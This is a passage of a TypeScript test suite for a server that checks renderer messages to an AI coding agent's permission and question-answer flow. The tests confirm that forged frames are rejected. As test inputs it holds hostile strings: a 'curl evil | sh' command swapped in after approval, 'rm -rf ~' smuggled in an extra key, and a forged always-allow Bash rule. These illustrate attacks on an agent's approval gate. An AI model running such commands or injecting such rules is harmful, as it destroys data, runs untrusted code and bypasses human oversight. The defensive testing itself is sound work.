      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'effort.set',
        requestId: 'rc-unsupported-effort',
        effort: 'forged-effort',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(
    received.some(
      f =>
        f.kind === 'run-control.result' &&
        f.requestId === 'rc-unsupported-effort' &&
        !f.ok,
    ),
  ).toBe(true)
  expect(calls).toEqual([])
})

test('P4-24c — rejects model.set with a NON-string model (Zod boundary), no domain call', () => {
  const { server, calls } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'model.set', requestId: 'rc5', model: 42 } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'run-control.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-24c — rejects fast.set with a NON-boolean active, no domain call', () => {
  const { server, calls } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'fast.set', requestId: 'rc6', active: 'yes' } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'run-control.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-24c — rejects model.set missing requestId at the schema boundary, no domain call', () => {
  const { server, calls } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'model.set', model: 'opus' } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'run-control.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-24c — rejects a run-control verb carrying an unexpected key (checkStrictKeys), no domain call', () => {
  const { server, calls } = makeRunControlsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      // A renderer-supplied extra key is rejected before the verb reaches the domain.
      message: {
        type: 'model.set',
        requestId: 'rc7',
        model: 'opus',
        provider: 'openai',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'run-control.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-24c — a run-control verb with no domain present fails closed (internal_error)', () => {
  // No runControls domain wired → the verb is structurally valid but has no
  // executor; it must fail closed, never silently succeed.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: { type: 'fast.set', requestId: 'rc8', active: true } as unknown as ClientFrame['message'],
    }),
  )

  expect(
    received.some(f => f.kind === 'error' && f.code === 'internal_error'),
  ).toBe(true)
  expect(received.some(f => f.kind === 'run-control.result')).toBe(false)
})

test('T5a — permission.response for an unknown requestId is rejected', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({ type: 'permission.response', requestId: 'never-minted', response: { behavior: 'allow', updatedInput: {} } }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'permission_not_found')).toBe(true)
})

test('T6 — an allow that rewrites updatedInput is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // Start a turn so the permission request is raised.
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  // Renderer approves but SWAPS the command — the human saw "ls".
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: { command: 'curl evil | sh' } },
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.message.includes('rewrite'))).toBe(true)
  // The request is still pending — the rewrite did not resolve it.
  expect(controller.getPendingPermissionRequests().length).toBe(1)
  expect(resolved).toBeNull()
})

test('T6 — an allow that echoes the gated input is accepted', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: { command: 'ls' } },
    }),
  )

  await waitFor(() => resolved !== null)
  expect(resolved).not.toBeNull()
  expect(resolved!.behavior).toBe('allow')
  // What reaches the engine is the GATED input, not renderer bytes.
  expect(allowInput(resolved)).toEqual({ command: 'ls' })
})

test('T6/F1 — an empty updatedInput forwards the GATED input, not "use original"', async () => {
  // The engine gated a safe input (https); an empty allow must not reverse that
  // gate back to the original (http). The sidecar forwards the gated input.
  let resolved: AppPermissionResponse | null = null
  const gated = { command: 'curl https://safe.example' }
  const controller = new AppSessionController(
    permissionAdapter(gated, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  // Bare allow with empty updatedInput.
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {} },
    }),
  )

  await waitFor(() => resolved !== null)
  expect(resolved!.behavior).toBe('allow')
  // NOT empty ("use original"): the gated https input is forwarded.
  expect(allowInput(resolved)).toEqual(gated)
})

test('T6b/F10 — an allow carrying updatedPermissions is REJECTED at the boundary', async () => {
  // updatedPermissions would install durable always-allow rules. It is not in the
  // renderer contract, so strict-key checking (F10) now rejects the whole frame
  // rather than accept-and-strip it — the stronger, fail-closed behavior. The
  // request stays pending and nothing reaches the engine.
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: {
        behavior: 'allow',
        updatedInput: { command: 'ls' },
        // A forged durable always-allow rule.
        updatedPermissions: [
          { type: 'addRules', rules: [{ toolName: 'Bash' }], behavior: 'allow', destination: 'session' },
        ],
      } as AppPermissionResponse,
    }),
  )

  const err = received.find(
    f => f.kind === 'error' && f.message.includes('updatedPermissions'),
  )
  expect(err).toBeDefined()
  // Not resolved: the forged frame never reached the engine.
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('T6b — sanitizePermissionResponse still strips updatedPermissions (defense-in-depth backstop)', async () => {
  // Even though F10 rejects such a frame at the boundary, the sanitizer remains a
  // backstop: if updatedPermissions ever reaches it, it is dropped before the
  // engine. Exercise the sanitizer directly (bypassing the strict-key layer).
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  // Call the internal sanitizer path via respondToPermissionRequest with the
  // sidecar's sanitize step applied — simulate a bypass by invoking the private
  // method through a cast.
  const sanitize = (
    server as unknown as {
      sanitizePermissionResponse: (
        conn: unknown,
        id: string,
        request: unknown,
        response: AppPermissionResponse,
      ) => AppPermissionResponse | null
    }
  ).sanitizePermissionResponse.bind(server)
  const pending = controller.getPendingPermissionRequests()[0]
  const sanitized = sanitize(
    { socket },
    'perm-1',
    pending!.request,
    {
      behavior: 'allow',
      updatedInput: { command: 'ls' },
      updatedPermissions: [
        { type: 'addRules', rules: [{ toolName: 'Bash' }], behavior: 'allow', destination: 'session' },
      ],
    } as AppPermissionResponse,
  )
  expect(sanitized).not.toBeNull()
  expect((sanitized as unknown as Record<string, unknown>).updatedPermissions).toBeUndefined()
  void resolved // unused; sanitizer path does not resolve the turn
})

test('C1 — allow + applySuggestions attaches the ENGINE-minted suggestion as updatedPermissions', async () => {
  // "Always allow": the renderer SELECTS (by index) among the suggestions the
  // engine minted on this request; the sidecar re-attaches the engine's own
  // update objects. The renderer never authors rule content (T6b intent).
  let resolved: AppPermissionResponse | null = null
  const suggestion = bashSuggestion('npm test:*')
  const controller = new AppSessionController(
    permissionAdapter({ command: 'npm test' }, r => {
      resolved = r
    }, [suggestion]),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)
  const engineSuggestions =
    controller.getPendingPermissionRequests()[0]!.request.permission_suggestions

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [0] },
    } as never),
  )

  await waitFor(() => resolved !== null)
  expect(resolved!.behavior).toBe('allow')
  const attached = (resolved as unknown as { updatedPermissions?: PermissionUpdate[] })
    .updatedPermissions
  // Deep-equal to the engine's own suggestion object…
  expect(attached).toEqual([suggestion])
  // …but CLONED, never aliasing the pending request's objects.
  expect(attached![0]).not.toBe(engineSuggestions![0])
  // The gated input is still what reaches the engine (T6 unchanged).
  expect(allowInput(resolved)).toEqual({ command: 'npm test' })
})

test('C1 — an empty applySuggestions is a plain allow-once (nothing attached)', async () => {
  // TUI parity: allow-once sends [] (BashPermissionRequest.tsx:346).
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }, [bashSuggestion('ls:*')]),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [] },
    } as never),
  )

  await waitFor(() => resolved !== null)
  expect(resolved!.behavior).toBe('allow')
  expect(
    (resolved as unknown as { updatedPermissions?: unknown }).updatedPermissions,
  ).toBeUndefined()
})

test('C1 — an out-of-range index is rejected fail-closed (request stays pending)', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }, [bashSuggestion('ls:*')]),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [1] },
    } as never),
  )

  const err = received.find(
    f => f.kind === 'error' && f.code === 'bad_request' && f.message.includes('applySuggestions'),
  )
  expect(err).toBeDefined()
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C1 — a selection against a request that minted NO suggestions is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [0] },
    } as never),
  )

  const err = received.find(
    f => f.kind === 'error' && f.message.includes('no permission_suggestions'),
  )
  expect(err).toBeDefined()
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C1 — non-integer, duplicate, and oversize selections are rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }, [bashSuggestion('ls:*'), bashSuggestion('pwd')]),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  const sendSelection = (applySuggestions: unknown) => {
    server.handleData(
      conn,
      clientFrame({
        type: 'permission.response',
        requestId: 'perm-1',
        response: { behavior: 'allow', updatedInput: {}, applySuggestions },
      } as never),
    )
  }

  sendSelection([0.5]) // non-integer
  sendSelection(['0']) // non-number
  sendSelection([-1]) // negative
  sendSelection([0, 0]) // duplicate
  sendSelection(Array.from({ length: 17 }, () => 0)) // over MAX_SUGGESTION_SELECTIONS
  sendSelection({ 0: 0 }) // non-array

  const errors = received.filter(
    f => f.kind === 'error' && f.code === 'bad_request' && f.message.includes('applySuggestions'),
  )
  expect(errors.length).toBe(6)
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C1 — applySuggestions on a deny is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }, [bashSuggestion('ls:*')]),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'deny', message: 'no', applySuggestions: [0] },
    } as never),
  )

  const err = received.find(
    f => f.kind === 'error' && f.message.includes('only valid on an allow'),
  )
  expect(err).toBeDefined()
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C1 — a selection resolves against ITS OWN request, not another pending one', async () => {
  // Two concurrent pendings with different engine suggestions: answering B with
  // index 0 must attach B's suggestion and leave A untouched (T5a discipline
  // extended to the selection).
  const resolvedById = new Map<string, AppPermissionResponse>()
  const suggestionA = bashSuggestion('aaa:*')
  const suggestionB = bashSuggestion('bbb:*')
  const controller = new AppSessionController({
    async *runTurn({ onPermissionRequest }) {
      await Promise.all([
        onPermissionRequest({
          requestId: 'perm-A',
          request: {
            subtype: 'can_use_tool',
            tool_name: 'Bash',
            input: { command: 'aaa' },
            tool_use_id: 'toolu_A',
            permission_suggestions: [suggestionA],
          },
        }).then(r => resolvedById.set('perm-A', r)),
        onPermissionRequest({
          requestId: 'perm-B',
          request: {
            subtype: 'can_use_tool',
            tool_name: 'Bash',
            input: { command: 'bbb' },
            tool_use_id: 'toolu_B',
            permission_suggestions: [suggestionB],
          },
        }).then(r => resolvedById.set('perm-B', r)),
      ])
    },
  })
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 2)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-B',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [0] },
    } as never),
  )

  await waitFor(() => resolvedById.has('perm-B'))
  const attached = (
    resolvedById.get('perm-B') as unknown as { updatedPermissions?: PermissionUpdate[] }
  ).updatedPermissions
  expect(attached).toEqual([suggestionB])
  // A is untouched and still pending.
  expect(resolvedById.has('perm-A')).toBe(false)
  expect(controller.getPendingPermissionRequests().length).toBe(1)
  expect(controller.getPendingPermissionRequests()[0]!.requestId).toBe('perm-A')
})

/* ------------------------------------------------------------------------- *
 * C5 — askUserQuestion.answer (decisions/ASK-USER-QUESTION-ANSWER.md, P4-20)
 * ------------------------------------------------------------------------- */

const ASK_QUESTIONS = [
  {
    question: 'Which date library?',
    header: 'Library',
    multiSelect: false,
    options: [
      { label: 'date-fns', description: 'lightweight', preview: 'import { format }' },
      { label: 'luxon', description: 'rich API' },
    ],
  },
  {
    question: 'Which features?',
    header: 'Features',
    multiSelect: true,
    options: [
      { label: 'parsing', description: '' },
      { label: 'formatting', description: '' },
      { label: 'timezones', description: '' },
    ],
  },
]

/** Adapter that raises exactly one AskUserQuestion request (a real live turn). */
function askQuestionAdapter(
  questions: unknown,
  onResolved: (r: AppPermissionResponse) => void,
): AppSessionControllerAdapter {
  return {
    async *runTurn({ onPermissionRequest }) {
      const request: AppPermissionRequest = {
        requestId: 'perm-1',
        request: {
          subtype: 'can_use_tool',
          tool_name: 'AskUserQuestion',
          input: { questions, metadata: { source: 'test' } },
          tool_use_id: 'toolu_ask',
        },
      }
      onResolved(await onPermissionRequest(request))
    },
  }
}

function askAnswerFrame(answers: unknown, requestId = 'perm-1'): Buffer {
  return clientFrame({
    type: 'askUserQuestion.answer',
    requestId,
    answers,
  } as never)
}

function answersOf(response: AppPermissionResponse | null): Record<string, string> {
  return (
    (allowInput(response) as { answers?: Record<string, string> } | undefined)
      ?.answers ?? {}
  )
}

test('C5 — LIVE PATH: an index answer resolves the real request with engine-labelled answers', async () => {
  // The renderer sends INDICES + freeform; the sidecar re-attaches the ENGINE's
  // own option labels and drives the real AppSessionController.respondToPermission
  // Request — proving real data flows (not a synthetic frame; CLAUDE.md §8.1).
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    askAnswerFrame([
      { optionIndices: [0] }, // single-select: date-fns
      { optionIndices: [0, 2], other: 'weekday helpers' }, // multi + freeform
    ]),
  )

  await waitFor(() => resolved !== null)
  expect(resolved!.behavior).toBe('allow')
  // Labels came from the ENGINE's own options (byte-fidelity); freeform appended;
  // multi-select joined with ", " exactly as the tool's outputSchema documents.
  expect(answersOf(resolved)).toEqual({
    'Which date library?': 'date-fns',
    'Which features?': 'parsing, timezones, weekday helpers',
  })
  // The engine's own gated questions + metadata are preserved (never the wire).
  const input = allowInput(resolved) as Record<string, unknown>
  expect(input.questions).toEqual(ASK_QUESTIONS)
  expect(input.metadata).toEqual({ source: 'test' })
})

test('C5 — LIVE PATH: a single-select "Other…" freeform answer is the freeform text', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    askQuestionAdapter([ASK_QUESTIONS[0]], r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(conn, askAnswerFrame([{ optionIndices: [], other: 'moment' }]))

  await waitFor(() => resolved !== null)
  expect(answersOf(resolved)).toEqual({ 'Which date library?': 'moment' })
})

test('C5 — an answer frame against a NON-AskUserQuestion request is rejected, stays pending', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(conn, askAnswerFrame([{ optionIndices: [0] }]))

  expect(
    received.some(
      f =>
        f.kind === 'error' &&
        f.code === 'bad_request' &&
        f.message.includes('AskUserQuestion'),
    ),
  ).toBe(true)
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C5 — an answer for an unknown requestId is permission_not_found', () => {
  const server = makeServer(new AppSessionController(askQuestionAdapter(ASK_QUESTIONS, () => {})))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, askAnswerFrame([{ optionIndices: [0] }], 'never-minted'))
  expect(received.some(f => f.kind === 'error' && f.code === 'permission_not_found')).toBe(true)
})

test('C5 — an out-of-range option index is rejected fail-closed (stays pending)', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  // Q1 has 2 options; index 5 is out of range.
  server.handleData(conn, askAnswerFrame([{ optionIndices: [5] }, { optionIndices: [0] }]))

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C5 — an answers array whose length ≠ questions is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  // Two questions, one answer.
  server.handleData(conn, askAnswerFrame([{ optionIndices: [0] }]))

  expect(
    received.some(
      f => f.kind === 'error' && f.code === 'bad_request' && f.message.includes('length'),
    ),
  ).toBe(true)
  expect(resolved).toBeNull()
})

test('C5 — a single-select question with two components is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  // Q1 is single-select but gets an option AND freeform.
  server.handleData(
    conn,
    askAnswerFrame([{ optionIndices: [0], other: 'x' }, { optionIndices: [0] }]),
  )

  expect(
    received.some(
      f =>
        f.kind === 'error' &&
        f.code === 'bad_request' &&
        f.message.includes('single-select'),
    ),
  ).toBe(true)
  expect(resolved).toBeNull()
})

test('C5 — a question answered with nothing is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(conn, askAnswerFrame([{ optionIndices: [] }, { optionIndices: [0] }]))

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(resolved).toBeNull()
})

test('C5 — a duplicate option index is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(conn, askAnswerFrame([{ optionIndices: [0] }, { optionIndices: [1, 1] }]))

  expect(
    received.some(
      f => f.kind === 'error' && f.code === 'bad_request' && f.message.includes('duplicate'),
    ),
  ).toBe(true)
  expect(resolved).toBeNull()
})

test('C5 — two questions with the SAME text are rejected, never collapsed into one answer', async () => {
  // The tool's answer map is keyed by question TEXT and AskUserQuestionTool puts
  // no uniqueness rule on its 1-4 questions. Two identically-worded ones passed
  // the arity check, each validated, and then overwrote each other — the engine
  // getting a partially answered tool result while the boundary reported success.
  const duplicated = [
    ASK_QUESTIONS[0],
    { ...ASK_QUESTIONS[1], question: ASK_QUESTIONS[0]!.question },
  ]
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    askQuestionAdapter(duplicated, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    askAnswerFrame([{ optionIndices: [0] }, { optionIndices: [1] }]),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  // Fail closed: nothing was answered, and the request is still answerable.
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C5 — an over-long freeform "other" is rejected by the schema', async () => {
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, () => {}),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    askAnswerFrame([
      { optionIndices: [0] },
      { optionIndices: [0], other: 'x'.repeat(5000) },
    ]),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

// A rejected answer MUST carry its requestId or the renderer cannot clear the
// in-flight guard it set before sending, leaving the operator unable to answer
// or decline a request that is still pending. Reachable without a compromised
// renderer (an honest over-long freeform paste).
test('C5 — a schema-rejected answer still correlates: the error carries the requestId and the request stays answerable', async () => {
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, () => {}),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)
  const requestId = controller.getPendingPermissionRequests()[0]!.requestId

  server.handleData(
    conn,
    askAnswerFrame(
      [{ optionIndices: [0] }, { optionIndices: [0], other: 'x'.repeat(5000) }],
      requestId,
    ),
  )

  const error = received.find(f => f.kind === 'error' && f.code === 'bad_request')
  expect(error?.kind).toBe('error')
  expect(error && 'requestId' in error ? error.requestId : undefined).toBe(requestId)
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C5 — a non-integer option index is rejected fail-closed', async () => {
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, () => {}),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    askAnswerFrame([{ optionIndices: [0.5] }, { optionIndices: [0] }]),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C5 — a non-array answers payload is rejected fail-closed', async () => {
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, () => {}),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(conn, askAnswerFrame({ 0: { optionIndices: [0] } }))
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C5 — an extra nested key on an answer is rejected (strict inner schema)', async () => {
  const controller = new AppSessionController(
    askQuestionAdapter(ASK_QUESTIONS, () => {}),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    askAnswerFrame([{ optionIndices: [0], evil: 1 }, { optionIndices: [0] }]),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C5 — an extra TOP-level key on the frame is rejected (checkStrictKeys)', () => {
  const server = makeServer(new AppSessionController(askQuestionAdapter(ASK_QUESTIONS, () => {})))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'askUserQuestion.answer',
      requestId: 'perm-1',
      answers: [{ optionIndices: [0] }],
      updatedInput: { questions: [] },
    } as never),
  )
  expect(
    received.some(
      f => f.kind === 'error' && f.code === 'bad_request' && f.message.includes('unexpected key'),
    ),
  ).toBe(true)
})

test('F10 — a frame with an extra key on an allowlisted type is rejected (not stripped)', () => {
  // The reused Zod schema STRIPS unknown keys; the contract requires rejection.
  // `{type:"app.ping", nonce, runCommand}` must produce bad_request, not a pong.
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({ type: 'app.ping', nonce: 'n', runCommand: 'rm -rf ~' } as never),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'pong')).toBe(false)
})

test('F10 — an unexpected key inside app.submit.options is rejected', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'app.submit',
      requestId: 'r1',
      prompt: 'hi',
      // `uuid` is engine identity, not a renderer-exposed field.
      options: { uuid: 'forged-uuid' },
    } as never),
  )
  const err = received.find(f => f.kind === 'error' && f.message.includes('uuid'))
  expect(err).toBeDefined()
})

test('F10 — an unexpected key toolUseID inside permission.response.response is rejected', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
